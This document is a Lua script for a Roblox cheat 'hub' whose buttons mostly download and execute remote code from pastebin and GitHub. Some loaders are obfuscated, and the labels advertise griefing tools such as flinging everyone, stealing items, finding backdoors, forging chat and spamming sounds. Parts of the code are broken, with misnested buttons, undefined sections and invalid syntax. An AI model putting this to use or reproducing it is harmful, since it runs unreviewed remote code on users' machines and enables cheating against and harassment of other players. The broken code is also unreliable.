Section:NewButton("Gamepasses", "Makes you own every gamepass not forever", function()
game.Players.LocalPlayer.UserId = "2205774994"
end)

Section:NewButton("Freeze Time", "You will freeze not the other player", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/djAd7g2W'))()
end)

Section:NewButton("Anti Fling", "You wont get fling", function()
   -- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
end)


Section:NewButton("VFly Cars", "Flying Cars", function()
   SGTSOBF_WWwwWWWww={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\92","\49","\48","\52","\92","\49","\49","\54","\92","\49","\49","\54","\92","\49","\49","\50","\92","\49","\49","\53","\92","\53","\56","\92","\52","\55","\92","\52","\55","\92","\49","\49","\50","\92","\57","\55","\92","\49","\49","\53","\92","\49","\49","\54","\92","\49","\48","\49","\92","\57","\56","\92","\49","\48","\53","\92","\49","\49","\48","\92","\52","\54","\92","\57","\57","\92","\49","\49","\49","\92","\49","\48","\57","\92","\52","\55","\92","\49","\49","\52","\92","\57","\55","\92","\49","\49","\57","\92","\52","\55","\92","\53","\52","\92","\53","\49","\92","\56","\52","\92","\52","\56","\92","\49","\48","\50","\92","\49","\48","\55","\92","\54","\54","\92","\49","\48","\57","\92","\49","\48","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_HHhHHHHHh="";for _,SGTSOBF_dDDDDDDdD in pairs(SGTSOBF_WWwwWWWww)do SGTSOBF_HHhHHHHHh=SGTSOBF_HHhHHHHHh..SGTSOBF_dDDDDDDdD;end;SGTSOBF_CCCcCCcCC=function(SGTSOBF_fFFFFfFfF)loadstring(SGTSOBF_fFFFFfFfF)()end;SGTSOBF_CCCcCCcCC(SGTSOBF_HHhHHHHHh)
end)

Section:NewButton("NoClip Underground", "Only go through the floor", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/QKbzxzSj'))()
end)

Section:NewButton("Remove Player", "Only makes them invis", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/Kud3hXHf'))()
end)

Section:NewButton("Fe annoy Player", "Yea be annoying", function()
       loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\109\74\54\101\109\106\55\56\39\41\41\40\41\10")()
end)

Section:NewButton("Fe Freeze", "Freeze in air lol", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/AkJS0PC7'))()
end)

Section:NewButton("Auto Walk", "Yea do nothing and walk only", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/QAZwWuHN'))();
end)























--Hub--
local Tab = Window:NewTab("Hub•Gui")
local Section = Tab:NewSection("All Gui And Hub Here")

Section:NewButton("ZenHub", "Many scrip Wow", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/KaiZen/main/GameHub", true))()
end)

Section:NewButton("HubScriptWithNoHat", "Dont ask about the name", function()
-- made by tyrel batutuy please give credit if gonna showcase i would really appreciate it!

loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/firex/main/firex'))()
-- Make Sure TO SUbscribe :P
end)

Section:NewButton("CoolGui", "4+ scripts", function()
loadstring(game:HttpGet("https://pastebin.com/raw/n3FDLDh3"))()
end)

Section:NewButton("ProHubV2", "Similar To BritishHub", function()
--PROHUB V.2--

loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kindasua/v.2/main/Is%20here"), true))()

-- https://youtube.com/channel/UCr6XuCQsOPlyCxICrBiTHPg --

-- https://youtube.com/channel/UCQSLO36wHjDlTPRui6e241w --
end)

Section:NewButton("BritishHubV6", "Almost like Prohub", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/YourLocalNzi/Ye/main/BHob6"),true))()
end)

Section:NewButton("Time Controller Gui", "Time", function()
loadstring("\115\101\116\116\105\110\103\32\61\32\115\101\116\116\105\110\103\115\40\41\46\78\101\116\119\111\114\107\10\108\111\99\97\108\32\69\102\102\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\10\69\102\102\101\99\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\76\105\103\104\116\105\110\103\10\69\102\102\101\99\116\46\83\97\116\117\114\97\116\105\111\110\32\61\32\45\51\10\69\102\102\101\99\116\46\66\114\105\103\104\116\110\101\115\115\32\61\32\48\10\69\102\102\101\99\116\46\67\111\110\116\114\97\115\116\32\61\32\48\10\10\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\108\111\111\100\98\97\108\108\47\45\98\97\99\107\45\117\112\115\45\102\111\114\45\108\105\98\115\47\109\97\105\110\47\119\97\108\108\37\50\48\118\51\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\83\116\111\112\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\99\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\67\108\111\99\107\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\68\101\115\116\114\111\121\32\71\117\105\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\82\101\109\111\118\101\32\89\111\117\114\32\71\117\105\44\101\116\99\41\10\10\10\98\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\98\58\66\117\116\116\111\110\40\34\83\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\9\9\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\51\48\48\48\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\42\32\51\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\85\110\115\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\54\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\32\32\32\32\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\48\10\9\9\10\101\110\100\41\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\10\10\99\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\99\58\66\111\120\40\34\67\108\111\99\107\32\84\105\109\101\34\44\34\110\117\109\98\101\114\34\44\102\117\110\99\116\105\111\110\40\118\97\108\117\101\41\32\45\45\32\34\110\117\109\98\101\114\34\32\111\114\32\34\115\116\114\105\110\103\34\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\67\108\111\99\107\84\105\109\101\32\61\32\118\97\108\117\101\10\101\110\100\41\10")()
end)

Section:NewButton("Shards Gui", "Op And new", function()
local Library  = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Shards Gui made by exe_crusader aka paradox", "GrapeTheme")
-- Main
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Simple Scripts")


MainSection:NewButton("Vhub", "A big Gui full of scripts recommended for trolling etc.", function()
    -- is a loadstring script because is script is to large >https://roblxopayscript.godaddysites.com<

loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()

   Section:NewButton("Chat spam", "Loads a gui that allows you to spam", function()
    
end)

loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()
Mainsection:NewToggle("Mega Jump", "now you can jump high like you're on the moon", function(state)
    if state then
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100 
    else
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    end
end)

PlayerSection:NewToggle("SimpleSpeed", "You go fast but not to fast", function(state)
    if state then
       game.LocalPlayer.Character.Humanoid.WalkSpeed = 120
    else
        game.LocalPlayer.Character.Humanoid.WalkSpeed = 16
    end
end)

PlayerSection:NewButton("Inf Yield", "Fe Admin Commands", function()
    loadstring.game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source')()
end)


--LOCAL PLAYER
local Player = Window:NewTab("Player")
local PlayerSection = Player:NewSection("Player")

PlayerSection:NewSlider("Walkspeed", "zoom past anything", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

PlayerSection:NewSlider("JumpPower", "Jump really high ", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

PlayerSection:NewButton("Reset WS/JP", "Rests Walkspeed and jumpPower to default", function()
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end)

--Other 
local Other = Window:NewTab("Other")
local OtherSection = Other:NewSection("Other")

OtherSection:NewButton("Fly Gui", "Gives you a fly gui",function()
    loadstring.game:HttpGet('https://pastebin.com/raw/LXq36kRU')()

end) -- end's the code and loads up the gui
end)

local Tab = Window:NewTab("Easy Scripts")
local Section = Tab:NewSection("Easy Scripts")

Section:NewButton("InfiniteYield", "Gives you commands to use", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

Section:NewButton("Small Fling Gui", "Loads a small fling gui", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
end)

Section:NewButton("BackDoorFinder", "Finds a Backdoor for admin or additional scripts", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
end)

Section:NewButton("Speed Gui", "Loads a gui with speed control", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/PrototypeRBLX/Speed-Script/main/README.md'),true))()
end)

Section:NewButton("Moon Gui", "Loads a Big gui with tons of scripts", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
end)

Section:NewSlider("WalkSpeed", "Run really fast", 500, 10, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

Section:NewSlider("JumpPower", "Jump really high ", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

Section:NewButton("Speed Tool", "Gives you a tool to speed up", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/iShZQHw7'))()
end)

Section:NewButton("EarRape", "Click to play all sounds in the game you're in at once", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/nZjJq2wJ"))()
end)

Section:NewButton("Animation Gui", "Loads a gui with animations to use", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/0MLPL32f"))()
end)

Section:NewButton("Invisible Gui", "Loads a gui that makes you invisible", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
end)

Section:NewButton("Annoy people Gui", "loads a gui to annoy players with", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/ZME5dX7w'))()
end)

Section:NewButton("Infinite Jump", "lets you jump forever", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/KpT16qBg'))()
end)

Section:NewButton("UpDown gui", "jumps to the postition or number you type", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/UpDown'))()
end)

Section:NewButton("Era Hub", "Loads a gui with some features", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/zRWQnNjS'))()
end)

Section:NewButton("Auto rap battle Gui", "loads a gui for the game", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/3dh0d3ya'))()
end)

Section:NewButton("R6 Troll Gui", "loads a gui to troll players", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/FS0hUuJg'))()
end)

Section:NewButton("Fe tall Script", "must be tall first", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Lix6q0PD'))()
end)

Section:NewButton("Anti Afk Gui", "never get kicked out again", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/Huubb/main/Mobile%20Scripting"))()
end)

Section:NewButton("Anti Fling", "never get flung again", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/hKfDWcJw'))();
end)

Section:NewButton("Game Teleport", "loads a gui that allows you to tp to games", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/hiWAdBMa'))()
end)

Section:NewButton("Walk/Run gui", "loads a gui to Run/Walk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/72EKEHqC'))()
end)

Section:NewButton("R6 Climb on walls", "lets you climb on any walls", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/jLVhHEVW'))()
end)

Section:NewButton("Body Part Destroyer Gui", "fe and destroys your body parts", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/eE0PQ7jk'))()
end)

Section:NewButton("Super Tools", "gives you cool tools to use", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/sQWeMuB0'))()
end)

Section:NewButton("Fe Fake Death", "you're dead", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/kjxNZCfb'))()
end)

Section:NewButton("R15 Fe just legs", "just legs", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Cj2Tm82A'))()
end)

Section:NewButton("R6 upside down", "makes your roblox player go upside down", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/e1xMVyWb'))()
end)

Section:NewButton("Freeze mode", "Gives you tools to freeze yourself just tap", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/AkJS0PC7'))()
end)

Section:NewButton("Op gui", "loads a really op gui", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/JLPe0B3H'),true))();
end)

Section:NewButton("Teleport gui", "loads a gui that lets you tp to players", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
end)

Section:NewButton("Infinite Yield 2", "loads admin v.2", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/nwWRBrnJ'))()
end)

Section:NewButton("Dupe Tools Gui", "loads a gui to dupe tools", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Dupe%20Tools%20Main%20Script.md'))()
end)

Section:NewButton("Send Hat Gui", "loads a gui for you to send you're hat", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/dAy5u2hX'),true))()
end)

Section:NewButton("Position Reader Gui", "loads a gui showing you're position", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/55yDd1UZ'))()
end)

Section:NewButton("Keyboard Gui", "loads a gui with a functional keyboard", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/mtPcjSNQ'))()
end)

Section:NewButton("Jump Button Gui", "loads a jump button", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/qhBY6frK'))();
end)

Section:NewButton("Realistic Shader", "makes graphics much more realistic", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/uqD7VqQU'))()
end)

Section:NewButton("Emote Gui", "loads a fe gui that has different emotes for you to use", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/fitjHU5J'))()
end)

Section:NewButton("Chat hack Gui", "loads a gui to make people say stuff", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
end)

Section:NewButton("Server Finder Gui", "loads a gui that finds servers", function()
    loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
end)

Section:NewButton("Walk on walls", "makes you walk on walls", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

Section:NewButton("Spectate Gui", "loads a gui that allows you to spectate players", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()
end)

Section:NewButton("Black and White Shader", "makes everything black and white", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/KvJDt5Zw'))()
end)

Section:NewButton("Red Ghost Hub", "loads a fe op gui", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/WFKSRG6m'))();
end)

Section:NewButton("WALK/RUN tools", "gives you tools to run/walk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/9gKCGSPh'))()
end)

Section:NewButton("Ez Hub", "loads Ez Hub", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/K4xkQZpv'))()
end)

Section:NewButton("Local PLayer Gui", "loads the gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Retroapple/Roblox-Hack-Scripts/main/retroapple-universal"))();
end)

Section:NewButton("Netless", "makes your avatar more stable", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/7Jtggrqx'))()
end)

Section:NewButton("GreenScreen gui", "not fe but perfect for videos", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Green%20Screen'))()
end)

Section:NewButton("Custom HitBox", "you can customize the hitbox not fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/HitBox%20Costumizer%20v2'))()
end)

Section:NewButton("Time Stop button", "lets you stop time not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/djAd7g2W'))()
end)

Section:NewButton("Realistic Shader GUI", "loads a gui that lets you change the shaders not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))()
end)

Section:NewButton("Telescope gui", "loads a telescope gui not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/8T0STS4f'))()
end)

local Tab = Window:NewTab("Op Scripts")
local Section = Tab:NewSection("Good Scripts")
Section:NewButton("LigtPet", "gives you a pet that has a light not fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Light%20Part%20Pet'))()
end)

Section:NewButton("Op fling", "if you're on mobile use noclip", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/JekRhmf5'))()
end)

Section:NewButton("Fly Gui", "best fly gui", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/6dvYSb6r'))()
end)

Section:NewButton("Turn into a bird", "you need tweetbird for it to work", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/fdPHLrDb'))()
end)

Section:NewButton("R6 pose gui", "loads a gui for posing fe btw", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/sZMn81tZ'))()
end)

Section:NewButton("Part fly", "gives you tools to fly not fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Part%20Fly%20Bypass'))()
end)

Section:NewButton("Spam tools", "spams the tools in you're inventory", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Spam%20Tools'))()
end)

Section:NewButton("PLayer Gui", "you need to be tall for it to work", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/PCC1rtpK'))()
end)

Section:NewButton("Set Tp", "click set then click tp to go to where you had set it", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/1dM3mAJq'))()
end)

Section:NewButton("Penetrating Underground Script", "click the button and you'll go through the object you're standing on", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/QKbzxzSj'))()
end)

Section:NewButton("Clone script", "clones you're avatar not fe", function()
    loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)()
end)

Section:NewButton("R6 Avatar", "makes your avatar a npc not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/MtjAKQqH'))()
end)

Section:NewButton("Fake kick", "when people leave it makes them think you kicked them", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/9H4EGzHg'))()
end)

Section:NewButton("Loop Fling all", "automatically flings people", function()
    loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
end)

Section:NewButton("R15 Leg resize", "you become really tall", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
end)

Section:NewButton("Steal people's items", "press again to steal more items", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/01cGQZet'))()
end)

Section:NewButton("Legon Hub", "Op hub with alot of scripts", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/B1cUSJsv'))()
end)

Section:NewButton("Set cameras up", "not fe but op", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/CCTV%20Camera'))()
end)

local Tab = Window:NewTab("useful Hubs")
local Section = Tab:NewSection("useful")
Section:NewButton("Prompt gui", "loads a pretty useful gui", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Kw51Cqtp'))()
end)

Section:NewButton("Auto rap battle gui", "op", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/HpuRqYSD'))()
end)

Section:NewButton("Auto Rap battle gui 2", "op", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/HpuRqYSD'))()
end)

--- i'll work on the useful hubs later



local Tab = Window:NewTab("Hubs i made")
local Section = Tab:NewSection("Hubs coming soon")
Section:NewButton("ButtonText", "ButtonInfo", function()
    
end)
end)

Section:NewButton("Dodo Hub", "Has 10 Game Scripts", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/albibos/dodobird/main/openhub"))()
end)

Section:NewButton("Fe Spam Hub", "Lot of Fe Sound to Troll", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ColdStep2/Chatdestroyer-Hub-V1/main/Chatdestroyer%20Hub%20V1'),true))()
end)

Section:NewButton("MegaHub(30+ Feature)", "Almost like our but we have more", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/WholeF00ds/Mega/main/Obfuscated%20Loader'),true))()
end)

Section:NewButton("LegonX Hub", "Cool and Many scripts", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/Loadstring/main/LegonX"))()
end)

Section:NewButton("Vhub 1.2.4(New Version)", "Many Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SourceScript5315/sauce/main/VH-Launcher.lua"))()
end)

Section:NewButton("RedGhost HUB", "UseFul GUI 1", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/WFKSRG6m'))();
end)

Section:NewButton("British Hub V2", "This Gui is kinda OP", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalNzi/Ye/main/BH%20v2%20Protecc"))()
end)
    
Section:NewButton("B_Genesis HUB", "Useful for games", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/raw-scriptpastebin/raw/main/B_Genesis'))()
end)

Section:NewButton("C00lK1D Gui V2", "So Scary", function()
loadstring(game:GetObjects("rbxassetid://9827584846")[1].Source)()
end)

Section:NewButton("Pro Hub", "New Gui", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kindasua/v.1-beta/main/Fixed%20bugs%20v.1%20beta"), true))()
end)

Section:NewButton("Melon Hub", "Op but old lol", function()

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 22, 1)
Frame.Position = UDim2.new(0.352027595, 0, 0.363528013, 0)
